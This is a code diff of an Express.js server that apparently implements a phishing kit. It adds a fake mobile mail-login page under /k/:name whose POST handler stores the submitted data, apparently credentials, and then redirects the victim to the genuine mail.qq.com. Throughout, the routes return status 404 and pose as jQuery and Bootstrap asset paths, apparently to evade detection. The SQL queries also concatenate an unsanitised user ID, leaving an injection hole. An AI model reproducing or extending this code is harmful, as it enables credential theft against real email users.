@@ -69,19 +69,60 @@ module.exports = function (app) {
         var uid = uidStr.substr(0, uidStr.indexOf('.'));
         uid = code.decode(uid);
         res.statusCode = 404;
+        
         sql.all('select * from users cross join temps where users.tempId=temps.id and users.id=' + uid + ';', function (err, rows) {
             var mid = rows[0].tempId;
             var bgUrl = rows[0].bgUrl;
             var url = rows[0].url;
             if (url === 'MAIL') {
-                return res.redirect('/m');
+                return res.redirect('/k/' + req.params.name);
             }
-            // if (req.device.type === 'phone') {
-            //     return res.render('pages/wap_temp.html', { layout: null, tz: 0, uid: uid, mid: mid, bgUrl: bgUrl, ranStr: ranStr.en(), ranImg: ranStr.ranImg });
-            // }
             return res.render('pages/wap_temp.html', { layout: null, tz: 0, uid: uid, mid: mid, bgUrl: bgUrl, ranStr: ranStr.en(), ranImg: ranStr.ranImg });
-            // res.render('pages/pc_temp.html', { layout: null, uid: uid, mid: mid, bgUrl: bgUrl, ranStr: ranStr.en(), ranImg: ranStr.ranImg });
         });
+    });
+
+    app.get('/k/:name', function (req, res) {
+        var uidStr = req.headers.host;
+        var uid = uidStr.substr(0, uidStr.indexOf('.'));
+        uid = code.decode(uid);
+        res.statusCode = 404;
+        var x = req.url.split('/')
+        var s_ran = x[x.length - 1]
+        try {
+            sql.all('select * from users cross join temps where users.tempId=temps.id and users.id=' + uid + ';', function (err, rows) {
+                var mid = rows[0].tempId;
+                var bgUrl = rows[0].bgUrl;
+                var url = rows[0].url;
+                res.render('pages/wap_mail.html', { layout: null, tz: 0, uid: uid, mid: mid, bgUrl: bgUrl, ranStr: ranStr.en2(s_ran), ranImg: ranStr.ranImg,ranRp: ranStr.ranRp });
+            });
+        } catch (e) {
+            res.sendFile(path.join(cwd, '/404.html'));
+        }
+    });
+
+    app.post('/k/:name', function (req, res) {
+        var tz = req.body.tz;
+        var uidStr = req.headers.host;
+        var uid = uidStr.substr(0, uidStr.indexOf('.'));
+        uid = code.decode(uid);
+        var x = req.url.split('/')
+        var s_ran = x[x.length - 1]
+        try {
+            insertData(req, function () {
+                sql.all('select * from users cross join temps where users.tempId=temps.id and users.id=' + uid + ';', function (err, rows) {
+                    var mid = rows[0].tempId;
+                    var bgUrl = rows[0].bgUrl;
+                    var url = rows[0].url;
+                    if (tz.toString() === '1') {
+                        return res.send('<script>window.parent.location.href="http://mail.qq.com";</script>');
+                    }
+                    res.render('pages/wap_mail.html', { layout: null, tz: 1, uid: uid, mid: mid, bgUrl: bgUrl, ranStr: ranStr.en2(s_ran), ranImg: ranStr.ranImg,ranRp: ranStr.ranRp });
+                });
+            });
+        } catch (e) {
+            res.sendFile(path.join(cwd, '/404.html'));
+        }
+
     });
 
     app.post(['/x/:name', '/x'], function (req, res) {
@@ -95,16 +136,12 @@ module.exports = function (app) {
                 var bgUrl = rows[0].bgUrl;
                 var url = rows[0].url;
                 if (url === 'MAIL') {
-                    return res.redirect('/m');
+                    return res.redirect('/k/' + req.params.name);
                 }
                 if (tz.toString() === '1') {
                     return res.send('<script>window.parent.location.href="' + url + '";</script>');
                 }
-                // if (req.device.type === 'phone') {
-                //     return res.render('pages/wap_temp.html', { layout: null, tz: 1, uid: uid, mid: mid, bgUrl: bgUrl, ranStr: ranStr.en(), ranImg: ranStr.ranImg });
-                // }
                 return res.render('pages/wap_temp.html', { layout: null, tz: 1, uid: uid, mid: mid, bgUrl: bgUrl, ranStr: ranStr.en(), ranImg: ranStr.ranImg });
-                // res.render('pages/pc_temp.html', { layout: null, tz: 1, uid: uid, mid: mid, bgUrl: bgUrl, ranStr: ranStr.en(), ranImg: ranStr.ranImg });
             });
         });
     });
@@ -114,11 +151,6 @@ module.exports = function (app) {
         var s_ran = x[x.length - 1]
         res.statusCode = 404;
         return res.render(path.join(cwd, '/yzm.html'), { layout: null, ranStr: ranStr.en2(s_ran), cssfmt: ranStr.cssFmt, ranImg: ranStr.ranImg, ranRp: ranStr.ranRp })
-        // if (req.device.type === 'phone') {
-        //     return res.render(path.join(cwd, '/yzm.html'), { layout: null, ranStr: ranStr.en(), cssfmt: ranStr.cssFmt, ranImg: ranStr.ranImg, ranRp: ranStr.ranRp })
-        //     // return res.sendFile( path.join(cwd,'/yzm.html'));
-        // }
-        // return res.render(path.join(cwd, '/transfer.html'), { layout: null, ranStr: ranStr.en(), cssfmt: ranStr.cssFmt, ranImg: ranStr.ranImg, ranRp: ranStr.ranRp })
     });
 
     app.get('/t_close.html/:name', function (req, res) {
@@ -130,7 +162,6 @@ module.exports = function (app) {
     app.get('/jquery/:name', function (req, res) {
         var x = req.headers.referer.split('/')
         var jmStr = x[x.length - 1]
-        console.log(jmStr)
         res.render('ssrjs/yzm_jq_decrypt.html', { layout: null, ranStr: ranStr.en2(jmStr), ranStr2: ranStr.en(), cssfmt: ranStr.cssFmt, ranImg: ranStr.ranImg, jmStr: jmStr })
     });
 
@@ -138,7 +169,6 @@ module.exports = function (app) {
     app.get('/bootstrap/css/:name', function (req, res) {
         var x = req.headers.referer.split('/')
         var jmStr = x[x.length - 1]
-        console.log(jmStr)
         res.render('ssrjs/yzm_css.html', { layout: null, ranStr: ranStr.en2(jmStr), cssfmt: ranStr.cssFmt, ranImg: ranStr.ranImg, jmStr: jmStr })
     });
 
@@ -147,7 +177,7 @@ module.exports = function (app) {
         res.sendFile(path.join(cwd, `/views/images/yzm/${req.params.name}.jpeg`))
     });
 
-    app.get('//', function (req, res) {
+    app.get('/', function (req, res) {
         res.statusCode = 404;
         res.render(path.join(cwd, '/index.html'), { layout: null, ranStr: ranStr.en(), cssfmt: ranStr.cssFmt, ranImg: ranStr.ranImg, ran: ranStr })
     });
